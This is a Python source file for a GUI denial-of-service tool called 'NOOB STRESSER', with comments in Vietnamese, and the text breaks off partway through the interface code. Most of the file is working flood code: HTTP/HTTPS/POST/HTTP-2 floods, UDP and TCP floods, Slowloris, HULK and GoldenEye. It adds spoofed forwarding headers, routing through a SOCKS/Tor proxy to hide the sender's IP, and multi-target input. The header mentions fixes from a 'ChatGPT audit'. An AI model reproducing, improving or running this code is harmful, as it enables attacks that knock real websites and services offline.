"""
NOOB STRESSER v13.3 — WRAITHSTRIKE
ChatGPT audit fixes: proxy warn, SOCKS verify, h2 check, LogPanel lock,
sent label, stop-error false positive, thread count division, mode rename
"""

import pygame
import pygame.gfxdraw
import threading
import socket
import ssl
import time
import random
import string
import struct
import gc
import sys
import math
import os
import colorsys
import asyncio

try:
    import httpx
    try:
        import h2  # h2 backend cần thiết cho HTTP/2 thực sự
        HTTPX_OK = True
    except ImportError:
        HTTPX_OK = False  # httpx có nhưng thiếu h2
except ImportError:
    HTTPX_OK = False

# ── Fix #11: lưu GC threshold gốc trước khi tune ────────────────────────────
_GC_DEFAULT = gc.get_threshold()   # (700, 10, 10) mặc định CPython

def _optimize():
    threading.stack_size(65536)
    socket.setdefaulttimeout(2)
    gc.collect()
    # tune frequency, không disable — reference counting vẫn chạy
    gc.set_threshold(1200, 15, 8)
    if sys.platform == 'win32':
        try:
            import ctypes
            ctypes.windll.winmm.timeBeginPeriod(1)
        except: pass
_optimize()

# ── Fix #8: check PySocks, warn rõ thay vì silent install ───────────────────
try:
    import socks
    SOCKS_OK = True
except ImportError:
    SOCKS_OK = False
    # không auto-pip — caller được thông báo qua GUI log

# ── proxy globals ─────────────────────────────────────────────────────────────
_PROXY_ENABLED = False
_PROXY_HOST    = "127.0.0.1"
_PROXY_PORT    = 9050
_PROXY_TYPE    = "socks5"

# ── IP pool ───────────────────────────────────────────────────────────────────
_IP_POOL = []
def _build_pool(n=1000):
    seen = set()
    while len(_IP_POOL) < n:
        a = random.randint(1, 254)
        if a in (10, 127, 172, 192): continue
        ip = f"{a}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
        if ip not in seen:
            seen.add(ip); _IP_POOL.append(ip)
_build_pool()
def _rip(): return random.choice(_IP_POOL)

# ── Fix #3: stats lock nhất quán ─────────────────────────────────────────────
_stats_lock = threading.Lock()
def _inc(stats, key, val=1):
    with _stats_lock:
        stats[key] += val

# ── socket factory ────────────────────────────────────────────────────────────
def _make_socket(udp=False):
    kind = socket.SOCK_DGRAM if udp else socket.SOCK_STREAM
    # Fix #6: proxy chỉ TCP — UDP không qua proxy, không pretend otherwise
    if not udp and _PROXY_ENABLED and SOCKS_OK:
        s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
        pt = (socks.SOCKS5 if _PROXY_TYPE == "socks5"
              else socks.SOCKS4 if _PROXY_TYPE == "socks4"
              else socks.HTTP)
        try:
            s.set_proxy(pt, _PROXY_HOST, _PROXY_PORT)
        except Exception as e:
            s.close()
            # CẢNH BÁO: set_proxy thất bại → dùng socket trực tiếp, IP thật lộ
            import sys; print(f"[PROXY FALLBACK] {e} — IP thật đang dùng!", file=sys.stderr)
            s = socket.socket(socket.AF_INET, kind)
        return s
    s = socket.socket(socket.AF_INET, kind)
    if not udp:
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        # Fix #4 SO_SNDBUF: adaptive — không hardcode, check thực tế
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 131072)
        except OSError:
            pass
    else:
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 131072)
        except OSError:
            pass
    return s

# ── headers ───────────────────────────────────────────────────────────────────
AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "curl/8.7.1", "python-requests/2.31.0",
]
PATHS = ["/", "/index.html", "/login", "/api/v1/status", "/wp-admin",
         "/admin", "/.env", "/api/data", "/dashboard", "/search"]
REFERERS = ["https://www.google.com/search?q=", "https://www.bing.com/search?q=",
            "https://www.facebook.com/", "https://www.reddit.com/r/", "https://t.co/"]
ACCEPT_LANGS = ["en-US,en;q=0.9", "vi-VN,vi;q=0.9,en;q=0.8",
                "fr-FR,fr;q=0.9", "ja-JP,ja;q=0.9", "*"]

def _fake_headers():
    f1, f2, f3 = _rip(), _rip(), _rip()
    ref = random.choice(REFERERS) + "".join(random.choices(string.ascii_lowercase, k=6))
    return (
        f"X-Forwarded-For: {f1}, {f2}, {f3}\r\n"
        f"X-Real-IP: {f1}\r\nCF-Connecting-IP: {f1}\r\nTrue-Client-IP: {f1}\r\n"
        f"Forwarded: for={f1};proto=https;by={f2}\r\nVia: 1.1 {f2} (squid)\r\n"
        f"Referer: {ref}\r\nDNT: {random.randint(0,1)}\r\n"
        f"Upgrade-Insecure-Requests: 1\r\n"
        f"Sec-Fetch-Site: cross-site\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Dest: document\r\n"
        f"Accept-Language: {random.choice(ACCEPT_LANGS)}\r\n"
        f"Cookie: session={random.randbytes(16).hex()}\r\nTE: trailers\r\n"
    )

def _req(host, keep=True, method="GET"):
    rand_k = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    path   = random.choice(PATHS) + f"?{rand_k}={random.randint(1,999999)}"
    conn   = "keep-alive" if keep else "close"
    enc    = random.choice(["gzip, deflate, br", "gzip, deflate"])
    if method == "POST":
        body = "&".join(f"d{i}={random.randbytes(8).hex()}" for i in range(6)).encode()
        return (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
                f"User-Agent: {random.choice(AGENTS)}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(body)}\r\nCache-Control: no-cache\r\n"
                f"Connection: {conn}\r\n" + _fake_headers() + "\r\n").encode() + body
    return (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
            f"User-Agent: {random.choice(AGENTS)}\r\n"
            f"Accept: text/html,*/*;q=0.9\r\nAccept-Encoding: {enc}\r\n"
            f"Cache-Control: no-cache, no-store\r\nRange: bytes=0-\r\n"
            f"Connection: {conn}\r\n" + _fake_headers() + "\r\n").encode()

# ── Fix #1 + #2: keep-alive không dùng MSG_PEEK trên SSLSocket ───────────────
def _send_keepalive(s, payload, count, stats, stop_ev):
    """
    Gửi nhiều request trên cùng 1 TCP/TLS connection.
    Detect server-close qua exception (BrokenPipe/ConnectionReset/SSLError)
    thay vì MSG_PEEK — MSG_PEEK không support trên SSLSocket.
    Fix #10: sent = bytes gửi thành công, không claim = server processed.
    """
    sent = 0
    for _ in range(count):
        if stop_ev.is_set():
            _inc(stats, "sent", sent)
            return False
        try:
            s.sendall(payload)
            sent += 1
        except (BrokenPipeError, ConnectionResetError, OSError,
                ssl.SSLError, ssl.SSLEOFError):
            _inc(stats, "sent", sent)
            # Fix #9: nếu stop_ev set thì đây là abort có chủ đích, không phải error
            if not stop_ev.is_set():
                _inc(stats, "errors")
            return False
    _inc(stats, "sent", sent)
    return True

# ── attack functions ──────────────────────────────────────────────────────────
def _http_flood(host, port, stats, stop_ev):
    while not stop_ev.is_set():
        s = None
        try:
            s = _make_socket(); s.settimeout(2); s.connect((host, port))
            method  = random.choice(["GET", "GET", "GET", "POST"])
            payload = _req(host, keep=True, method=method)
            if not _send_keepalive(s, payload, 200, stats, stop_ev):
                _inc(stats, "errors")
        except Exception:
            _inc(stats, "errors")
        finally:
            if s:
                try: s.close()
                except: pass

def _https_flood(host, port, stats, stop_ev):
    # Fix #9: CERT_NONE là intentional với stress tool — document rõ
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE  # intentional: target là server mình sở hữu
    try: ctx.set_ciphers("ALL:@SECLEVEL=0")
    except: pass
    while not stop_ev.is_set():
        raw = None
        try:
            raw = _make_socket(); raw.settimeout(2); raw.connect((host, port))
            s   = ctx.wrap_socket(raw, server_hostname=host)
            method  = random.choice(["GET", "GET", "POST"])
            payload = _req(host, keep=True, method=method)
            if not _send_keepalive(s, payload, 150, stats, stop_ev):
                _inc(stats, "errors")
        except Exception:
            _inc(stats, "errors")
        finally:
            if raw:
                try: raw.close()
                except: pass

def _post_flood(host, port, stats, stop_ev):
    while not stop_ev.is_set():
        s = None
        try:
            s = _make_socket(); s.settimeout(2); s.connect((host, port))
            payload = _req(host, keep=True, method="POST")
            if not _send_keepalive(s, payload, 200, stats, stop_ev):
                _inc(stats, "errors")
        except Exception:
            _inc(stats, "errors")
        finally:
            if s:
                try: s.close()
                except: pass

def _udp_flood(host, port, stats, stop_ev):
    # Fix #6: UDP không qua proxy — không pretend
    try: ip = socket.gethostbyname(host)
    except: ip = host
    s = _make_socket(udp=True)
    sizes = list(range(512, 65508, 512))
    while not stop_ev.is_set():
        try:
            s.sendto(random.randbytes(random.choice(sizes)), (ip, port))
            _inc(stats, "sent")
        except Exception:
            _inc(stats, "errors")

def _syn_flood(host, port, stats, stop_ev):
    try: ip = socket.gethostbyname(host)
    except: ip = host
    while not stop_ev.is_set():
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect_ex((ip, port))
            _inc(stats, "sent")
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
        except Exception:
            _inc(stats, "errors")
        finally:
            if s:
                try: s.close()
                except: pass

def _slowloris(host, port, stats, stop_ev):
    # Fix #3: dùng _inc() thay vì stats["sent"] += 1 trực tiếp
    sockets = []
    for _ in range(400):
        if stop_ev.is_set(): break
        try:
            s = _make_socket(); s.settimeout(4); s.connect((host, port))
            s.sendall((f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {host}\r\n"
                       f"X-Forwarded-For: {_rip()}\r\nUser-Agent: {random.choice(AGENTS)}\r\n").encode())
            sockets.append(s); _inc(stats, "sent")
        except: pass
    while not stop_ev.is_set():
        for s in list(sockets):
            try:
                s.sendall(f"X-a: {_rip()}\r\n".encode())
                _inc(stats, "sent")
            except:
                sockets.remove(s); _inc(stats, "errors")
                try:
                    ns = _make_socket(); ns.settimeout(4); ns.connect((host, port))
                    ns.sendall((f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {host}\r\n"
                                f"X-Forwarded-For: {_rip()}\r\n").encode())
                    sockets.append(ns)
                except: pass
        time.sleep(8)
    for s in sockets:
        try: s.close()
        except: pass

def _rapid_reset(host, port, stats, stop_ev):
    try: ip = socket.gethostbyname(host)
    except: ip = host
    while not stop_ev.is_set():
        s = None
        try:
            s = _make_socket(); s.settimeout(0.5); s.connect((ip, port))
            s.sendall(_req(host, keep=False))
            _inc(stats, "sent")
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
        except Exception:
            _inc(stats, "errors")
        finally:
            if s:
                try: s.close()
                except: pass

def _cache_bypass(host, port, stats, stop_ev):
    while not stop_ev.is_set():
        s = None
        try:
            s = _make_socket(); s.settimeout(2); s.connect((host, port))
            rand = "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
            req  = (f"GET /?nocache={rand} HTTP/1.1\r\nHost: {host}\r\n"
                    f"Cache-Control: no-cache, no-store\r\nPragma: no-cache\r\n"
                    f"User-Agent: {random.choice(AGENTS)}\r\n"
                    + _fake_headers() + "\r\n").encode()
            if not _send_keepalive(s, req, 100, stats, stop_ev):
                _inc(stats, "errors")
        except Exception:
            _inc(stats, "errors")
        finally:
            if s:
                try: s.close()
                except: pass

def _goldeneye(host, port, stats, stop_ev):
    while not stop_ev.is_set():
        s = None
        try:
            s = _make_socket(); s.settimeout(4); s.connect((host, port))
            s.sendall((f"GET / HTTP/1.1\r\nHost: {host}\r\n"
                       f"User-Agent: {random.choice(AGENTS)}\r\n"
                       f"Connection: keep-alive\r\nKeep-Alive: 900\r\n"
                       + _fake_headers()).encode())
            for _ in range(50):
                if stop_ev.is_set(): break
                s.sendall(b"X-padding: " + random.randbytes(64) + b"\r\n")
                _inc(stats, "sent")
                time.sleep(0.3)
        except Exception:
            _inc(stats, "errors")
        finally:
            if s:
                try: s.close()
                except: pass

def _hulk(host, port, stats, stop_ev):
    while not stop_ev.is_set():
        s = None
        try:
            s = _make_socket(); s.settimeout(2); s.connect((host, port))
            rand = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
            req  = (f"GET /?{rand}={rand} HTTP/1.1\r\nHost: {host}\r\n"
                    f"User-Agent: {random.choice(AGENTS)}\r\n"
                    f"Referer: https://www.google.com/?q={rand}\r\n"
                    f"Connection: keep-alive\r\n"
                    + _fake_headers() + "\r\n").encode()
            if not _send_keepalive(s, req, 200, stats, stop_ev):
                _inc(stats, "errors")
        except Exception:
            _inc(stats, "errors")
        finally:
            if s:
                try: s.close()
                except: pass

def _garbage(host, port, stats, stop_ev):
    try: ip = socket.gethostbyname(host)
    except: ip = host
    s = _make_socket(udp=True)
    while not stop_ev.is_set():
        try:
            s.sendto(random.randbytes(65507), (ip, port))
            _inc(stats, "sent")
        except Exception:
            _inc(stats, "errors")

def _http_https_combined(host, port, stats, stop_ev):
    """
    Kết hợp HTTP + HTTPS cùng lúc trong 1 thread:
    spawn 2 sub-worker chạy song song — 1 HTTP thuần, 1 HTTPS TLS.
    Mỗi main thread → 2 connection thực tế cùng lúc.
    """
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    try: ctx.set_ciphers("ALL:@SECLEVEL=0")
    except: pass

    def _http_worker():
        while not stop_ev.is_set():
            s = None
            try:
                s = _make_socket(); s.settimeout(2); s.connect((host, port))
                payload = _req(host, keep=True, method=random.choice(["GET","GET","POST"]))
                if not _send_keepalive(s, payload, 200, stats, stop_ev):
                    _inc(stats, "errors")
            except Exception:
                _inc(stats, "errors")
            finally:
                if s:
                    try: s.close()
                    except: pass

    def _https_worker():
        while not stop_ev.is_set():
            raw = None
            try:
                raw = _make_socket(); raw.settimeout(2); raw.connect((host, port))
                s   = ctx.wrap_socket(raw, server_hostname=host)
                payload = _req(host, keep=True, method=random.choice(["GET","GET","POST"]))
                if not _send_keepalive(s, payload, 150, stats, stop_ev):
                    _inc(stats, "errors")
            except Exception:
                _inc(stats, "errors")
            finally:
                if raw:
                    try: raw.close()
                    except: pass

    t1 = threading.Thread(target=_http_worker,  daemon=True)
    t2 = threading.Thread(target=_https_worker, daemon=True)
    t1.start(); t2.start()
    t1.join();  t2.join()

def _http2_flood(host, port, stats, stop_ev):
    """
    HTTP/2 multiplexing flood — 50 concurrent streams trên 1 TCP connection.
    Cần: pip install httpx[h2]
    Mỗi main thread giữ 1 HTTP/2 connection, pump 50 streams cùng lúc.
    """
    if not HTTPX_OK:
        _http_https_combined(host, port, stats, stop_ev)
        return

    async def _h2_loop():
        limits = httpx.Limits(max_connections=1, max_keepalive_connections=1)
        async with httpx.AsyncClient(
            http2=True, verify=False, timeout=3.0, limits=limits
        ) as client:
            base = f"https://{host}:{port}"
            while not stop_ev.is_set():
                tasks = [
                    client.get(
                        f"{base}{random.choice(PATHS)}?r={random.randint(0,999999)}",
                        headers={
                            "User-Agent":      random.choice(AGENTS),
                            "X-Forwarded-For": _rip(),
                            "Cache-Control":   "no-cache",
                        }
                    )
                    for _ in range(50)
                ]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for r in results:
                    if isinstance(r, Exception):
                        _inc(stats, "errors")
                    else:
                        _inc(stats, "sent")

    loop = asyncio.new_event_loop()
    try:
        loop.run_until_complete(_h2_loop())
    except Exception:
        _inc(stats, "errors")
    finally:
        loop.close()

def _check_proxy(host, port, timeout=3):
    """
    Test proxy thật sự:
    1. TCP connect
    2. Gửi SOCKS5 greeting (version + no-auth)
    3. Verify server trả về SOCKS5 + method accepted
    Nếu server không phải SOCKS5 → trả về False dù TCP OK.
    """
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        # SOCKS5 client greeting: VER=5, NMETHODS=1, METHOD=0 (no auth)
        s.sendall(b"\x05\x01\x00")
        resp = s.recv(2)
        s.close()
        # Server trả VER=5, METHOD=0 → SOCKS5 confirmed
        return len(resp) == 2 and resp[0] == 0x05 and resp[1] == 0x00
    except Exception:
        return False

ATTACK_MAP = {
    "HTTP/2 Flood": _http2_flood,
    "HTTP+HTTPS":   _http_https_combined,
    "HTTP Flood":   _http_flood,
    "HTTPS Flood":  _https_flood,
    "POST Flood":   _post_flood,
    "UDP Flood":    _udp_flood,
    "TCP Flood":    _syn_flood,    # userspace half-open, không phải raw SYN
    "Slowloris":    _slowloris,
    "TCP Reset":    _rapid_reset,  # TCP RST, không phải HTTP/2 RST_STREAM
    "Cache Bypass": _cache_bypass,
    "GoldenEye":    _goldeneye,
    "HULK":         _hulk,
    "Garbage":      _garbage,
}

# ── Fix #4 + #5: thread pool với deadline độc lập ────────────────────────────
def _spawn_threads(fn, host, port, count, stop_ev, stats, duration):
    """
    Batch spawn + deadline timer độc lập với GUI.
    Fix #4: trả về live_threads list.
    Fix #5: deadline set stop_ev sau duration giây — không phụ thuộc GUI callback.
    """
    live_threads = []
    batch = 150; spawned = 0; consec_fail = 0

    # deadline timer độc lập
    def _deadline():
        time.sleep(duration)
        stop_ev.set()
    threading.Thread(target=_deadline, daemon=True).start()

    for i in range(0, count, batch):
        if stop_ev.is_set(): break
        b = min(batch, count - i)
        for _ in range(b):
            try:
                t = threading.Thread(target=fn,
                                     args=(host, port, stats, stop_ev),
                                     daemon=True)
                t.start()
                live_threads.append(t)
                spawned += 1; consec_fail = 0
            except (RuntimeError, OSError):
                consec_fail += 1
                _inc(stats, "errors")
                if consec_fail >= 5: return live_threads  # OS cap
        time.sleep(0.01 + spawned / 100000)

    # health monitor
    def _monitor():
        prev = len(live_threads)
        while not stop_ev.is_set():
            time.sleep(10)
            alive = sum(1 for t in live_threads if t.is_alive())
            if alive < prev * 0.5 and alive < 10:
                _inc(stats, "errors", prev - alive)
            prev = alive
    threading.Thread(target=_monitor, daemon=True).start()
    return live_threads


# ═══════════════════════════════════════════════════════════════════════════════
# PYGAME GUI  (giữ nguyên v12 — chỉ wire lại engine)
# ═══════════════════════════════════════════════════════════════════════════════
C_BG       = (6,   4,   4)
C_PANEL    = (14,  10,  10)
C_PANEL2   = (20,  14,  14)
C_RED      = (220, 20,  20)
C_RED_DIM  = (120, 10,  10)
C_RED_GLOW = (255, 50,  50)
C_BORDER   = (60,  10,  10)
C_BORDER_H = (180, 30,  30)
C_FG       = (210, 200, 200)
C_DIM      = (90,  70,  70)
C_GREEN    = (0,   180, 80)
C_CYAN     = (0,   190, 220)
C_YELLOW   = (220, 180, 0)
C_BLACK    = (0,   0,   0)
C_SHADOW   = (2,   1,   1)
C_ORANGE   = (255, 100, 0)

W, H = 1000, 750

def draw_rect_3d(surf, rect, color, depth=4, pressed=False):
    x, y, w, h = rect
    pygame.draw.rect(surf, C_SHADOW, (x+depth, y+depth, w, h), border_radius=6)
    pygame.draw.rect(surf, color, rect, border_radius=6)
    hl = tuple(min(255, c+40) for c in color)
    sh = tuple(max(0,  c-40) for c in color)
    if pressed: hl, sh = sh, hl
    pygame.draw.line(surf, hl, (x+6, y+1),   (x+w-7, y+1),   1)
    pygame.draw.line(surf, hl, (x+1, y+6),   (x+1, y+h-7),   1)
    pygame.draw.line(surf, sh, (x+6, y+h-2), (x+w-7, y+h-2), 1)
    pygame.draw.line(surf, sh, (x+w-2, y+6), (x+w-2, y+h-7), 1)
    pygame.draw.rect(surf, C_BORDER, rect, 1, border_radius=6)

def draw_glow_rect(surf, rect, color, radius=8, alpha=60):
    x, y, w, h = rect
    gs = pygame.Surface((w+radius*2, h+radius*2), pygame.SRCALPHA)
    for i in range(radius, 0, -1):
        a = int(alpha * (i/radius) ** 1.5)
        pygame.draw.rect(gs, (*color, a),
                         (radius-i, radius-i, w+i*2, h+i*2), border_radius=6+i)
    surf.blit(gs, (x-radius, y-radius))

def draw_text_glow(surf, text, font, color, pos, glow_color=None, glow_r=4):
    gc_col = glow_color or color
    cx, cy = pos
    gs = pygame.Surface((surf.get_width(), surf.get_height()), pygame.SRCALPHA)
    for dx in range(-glow_r, glow_r+1, 2):
        for dy in range(-glow_r, glow_r+1, 2):
            if dx == 0 and dy == 0: continue
            a = int(80 * (1 - math.sqrt(dx*dx+dy*dy)/(glow_r*1.4)))
            if a <= 0: continue
            gs.blit(font.render(text, True, (*gc_col[:3], a)), (cx+dx, cy+dy))
    surf.blit(gs, (0, 0))
    surf.blit(font.render(text, True, color), (cx, cy))

def draw_rainbow_text(surf, text, font, pos, speed=1.8, char_offset=0.07):
    """Vẽ text cầu vồng lấp lánh — mỗi ký tự 1 màu HSV khác nhau, cycle theo time."""
    x, y = pos
    t = time.time() * speed
    for i, ch in enumerate(text):
        hue = (t + i * char_offset) % 1.0
        r, g, b = colorsys.hsv_to_rgb(hue, 1.0, 1.0)
        col  = (int(r*255), int(g*255), int(b*255))
        # glow nhẹ
        gc2  = (int(r*180), int(g*180), int(b*180))
        gs   = font.render(ch, True, (*gc2, 60))
        gsurf = pygame.Surface((font.size(ch)[0]+4, font.get_height()+4), pygame.SRCALPHA)
        gsurf.blit(font.render(ch, True, (*gc2, 50)), (2, 2))
        surf.blit(gsurf, (x-2, y-2))
        surf.blit(font.render(ch, True, col), (x, y))
        x += font.size(ch)[0]

def draw_circuit_bg(surf, seed=42):
    rng = random.Random(seed)
    for _ in range(80):
        x = rng.randint(0, W); y = rng.randint(0, H)
        l = rng.randint(20, 120); h = rng.choice([True, False])
        col = (rng.randint(15,25), rng.randint(5,10), rng.randint(5,10))
        if h:
            pygame.draw.line(surf, col, (x,y), (x+l,y), 1)
            if rng.random() > 0.5: pygame.draw.circle(surf, col, (x+l,y), 2)
        else:
            pygame.draw.line(surf, col, (x,y), (x,y+l), 1)
            if rng.random() > 0.5: pygame.draw.circle(surf, col, (x,y+l), 2)

_SCANLINES_CACHE = None
def draw_scanlines(surf):
    global _SCANLINES_CACHE
    if _SCANLINES_CACHE is None:
        _SCANLINES_CACHE = pygame.Surface((W, H), pygame.SRCALPHA)
        for y in range(0, H, 4):
            pygame.draw.line(_SCANLINES_CACHE, (0,0,0,18), (0,y), (W,y))
    surf.blit(_SCANLINES_CACHE, (0,0))

def draw_progress_bar(surf, rect, pct, color=C_RED):
    x, y, w, h = rect
    pygame.draw.rect(surf, C_PANEL, rect, border_radius=4)
    pygame.draw.rect(surf, C_BORDER, rect, 1, border_radius=4)
    fw = int(w * pct)
    if fw > 4:
        pygame.draw.rect(surf, C_RED_DIM, (x,y,fw,h), border_radius=4)
        pygame.draw.rect(surf, color, (x,y,max(fw-8,1),h), border_radius=4)
        if fw > 10:
            pygame.draw.rect(surf, C_RED_GLOW, (x+fw-8,y+1,6,h-2), border_radius=3)
        draw_glow_rect(surf, (x,y,fw,h), color, radius=4, alpha=40)


class InputBox:
    def __init__(self, x, y, w, h, text="", label=""):
        self.rect  = pygame.Rect(x, y, w, h)
        self.text  = text
        self.label = label
        self.active     = False
        self.cursor_vis = True
        self.cursor_t   = 0

    def handle_event(self, ev):
        if ev.type == pygame.MOUSEBUTTONDOWN:
            self.active = self.rect.collidepoint(ev.pos)
        if ev.type == pygame.KEYDOWN and self.active:
            if ev.key == pygame.K_BACKSPACE: self.text = self.text[:-1]
            elif ev.unicode and ev.unicode.isprintable(): self.text += ev.unicode

    def update(self, dt):
        self.cursor_t += dt
        if self.cursor_t > 500:
            self.cursor_vis = not self.cursor_vis
            self.cursor_t   = 0

    def draw(self, surf, font_s, font_l):
        x, y, w, h = self.rect
        col    = C_PANEL2 if not self.active else (28,18,18)
        border = C_BORDER_H if self.active else C_BORDER
        lbl = font_l.render(self.label, True, C_DIM)
        surf.blit(lbl, (x, y-16))
        pygame.draw.rect(surf, C_SHADOW, (x+2,y+2,w,h), border_radius=4)
        pygame.draw.rect(surf, col, self.rect, border_radius=4)
        pygame.draw.rect(surf, border, self.rect, 1, border_radius=4)
        pygame.draw.line(surf, (35,25,25), (x+4,y+1), (x+w-5,y+1))
        if self.active: draw_glow_rect(surf, (x,y,w,h), C_RED, radius=5, alpha=35)
        display = self.text + ("|" if self.active and self.cursor_vis else "")
        surf.blit(font_s.render(display, True, C_FG), (x+8, y+h//2 - font_s.get_height()//2))


class ModeCard:
    def __init__(self, x, y, w, h, name, layer, stars):
        self.rect     = pygame.Rect(x, y, w, h)
        self.name     = name
        self.layer    = layer
        self.stars    = stars
        self.selected = False
        self.hover    = False

    def handle_event(self, ev):
        if ev.type == pygame.MOUSEMOTION:
            self.hover = self.rect.collidepoint(ev.pos)
        if ev.type == pygame.MOUSEBUTTONDOWN and ev.button == 1:
            if self.rect.collidepoint(ev.pos): return True
        return False

    def draw(self, surf, fn, fm):
        x, y, w, h = self.rect
        if self.selected:
            col = (30,8,8); border = C_RED
            draw_glow_rect(surf, (x,y,w,h), C_RED, radius=8, alpha=50)
        elif self.hover:
            col = (22,12,12); border = C_RED_DIM
        else:
            col = C_PANEL; border = C_BORDER
        draw_rect_3d(surf, (x,y,w,h), col, depth=3, pressed=self.selected)
        pygame.draw.rect(surf, border, self.rect, 1, border_radius=6)
        lyr_col = C_GREEN if self.layer == "L7" else C_CYAN
        surf.blit(fm.render(self.layer, True, lyr_col), (x+6, y+4))
        ny = y + h//2 - fn.get_height()//2
        if self.name == "HTTP+HTTPS":
            draw_rainbow_text(surf, self.name, fn, (x+6, ny), speed=1.8, char_offset=0.09)
        else:
            ncol = C_RED_GLOW if (self.selected or self.hover) else C_FG
            surf.blit(fn.render(self.name, True, ncol), (x+6, ny))
        ss = fm.render(self.stars, True, C_YELLOW if self.selected else C_DIM)
        surf.blit(ss, (x+w-ss.get_width()-6, y+h-ss.get_height()-4))


class LogPanel:
    def __init__(self, x, y, w, h):
        self.rect  = (x, y, w, h)
        self.lines = []
        self._lock = threading.Lock()  # Fix #13: guard list từ multi-thread write

    def add(self, msg, tag="info"):
        ts = time.strftime("%H:%M:%S")
        with self._lock:
            self.lines.append((f"[{ts}] {msg}", tag))
            if len(self.lines) > 80: self.lines.pop(0)

    def draw(self, surf, font):
        x, y, w, h = self.rect
        pygame.draw.rect(surf, C_PANEL, self.rect, border_radius=4)
        pygame.draw.rect(surf, C_BORDER, self.rect, 1, border_radius=4)
        pygame.draw.line(surf, C_SHADOW, (x+4,y+1), (x+w-5,y+1))
        TAG = {"ok": C_GREEN, "error": C_RED_GLOW, "warn": C_YELLOW,
               "stat": C_CYAN, "info": C_DIM}
        lh = font.get_height() + 2
        mv = (h-10) // lh
        with self._lock:
            snapshot = list(self.lines[-mv:])  # snapshot để draw không race với add
        for i, (text, tag) in enumerate(snapshot):
            surf.blit(font.render(text, True, TAG.get(tag, C_DIM)), (x+8, y+5+i*lh))


# ── main app ──────────────────────────────────────────────────────────────────
class NoobApp:
    MODES = [
        ("HTTP/2 Flood", "L7", "★★★★★"),
        ("HTTP+HTTPS",   "L7", "★★★★★"),
        ("HTTP Flood",   "L7", "★★★★☆"),
        ("HTTPS Flood",  "L7", "★★★★★"),
        ("POST Flood",   "L7", "★★★★☆"),
        ("UDP Flood",    "L4", "★★★☆☆"),
        ("TCP Flood",    "L4", "★★★☆☆"),
        ("Slowloris",    "L7", "★★★★☆"),
        ("TCP Reset",    "L4", "★★★☆☆"),
        ("Cache Bypass", "L7", "★★★★☆"),
        ("GoldenEye",    "L7", "★★★★☆"),
        ("HULK",         "L7", "★★★★★"),
        ("Garbage",      "L4", "★★★☆☆"),
    ]

    def __init__(self):
        pygame.init()
        pygame.display.set_caption("NOOB STRESSER v13.0 · WRAITHSTRIKE")
        self.surf  = pygame.display.set_mode((W, H), pygame.RESIZABLE)
        self.clock = pygame.time.Clock()

        self.f_title  = pygame.font.SysFont("Consolas", 26, bold=True)
        self.f_sub    = pygame.font.SysFont("Consolas", 10)
        self.f_mode   = pygame.font.SysFont("Consolas", 10, bold=True)
        self.f_meta   = pygame.font.SysFont("Consolas", 9)
        self.f_label  = pygame.font.SysFont("Consolas", 9)
        self.f_stat_l = pygame.font.SysFont("Consolas", 22, bold=True)
        self.f_stat_s = pygame.font.SysFont("Consolas", 9)
        self.f_btn    = pygame.font.SysFont("Consolas", 14, bold=True)
        self.f_log    = pygame.font.SysFont("Consolas", 9)

        self._running      = False
        self._stop_ev      = threading.Event()
        self._stats        = {"sent": 0, "errors": 0}
        self._start_ts     = 0
        self._duration     = 60
        self._btn_pressed  = False
        self._live_threads = []
        # Fix #12: track giây đã log để không duplicate
        self._last_log_sec = -1

        self._bg = pygame.Surface((W, H))
        self._bg.fill(C_BG)
        draw_circuit_bg(self._bg)

        cw, ch = 174, 48; cx0, cy0 = 14, 178
        self._cards = []
        for i, (name, layer, stars) in enumerate(self.MODES):
            r, c = divmod(i, 6)
            self._cards.append(ModeCard(
                cx0 + c*(cw+3), cy0 + r*(ch+4), cw, ch, name, layer, stars))
        self._cards[0].selected = True

        self.inp_target   = InputBox(14,  396, 300, 30, "host1.com,host2.com", "TARGET(S) — dấu phẩy để multi")
        self.inp_port     = InputBox(324, 396, 80,  30, "443",             "PORT (1-65535)")
        self.inp_threads  = InputBox(414, 396, 90,  30, "500",             "THREADS")
        self.inp_duration = InputBox(514, 396, 90,  30, "60",              "DURATION (s)")
        self.inp_proxy_h  = InputBox(624, 396, 140, 30, "127.0.0.1",       "PROXY HOST (TCP only)")
        self.inp_proxy_p  = InputBox(774, 396, 70,  30, "9050",            "PROXY PORT")
        self._inputs = [self.inp_target, self.inp_port, self.inp_threads,
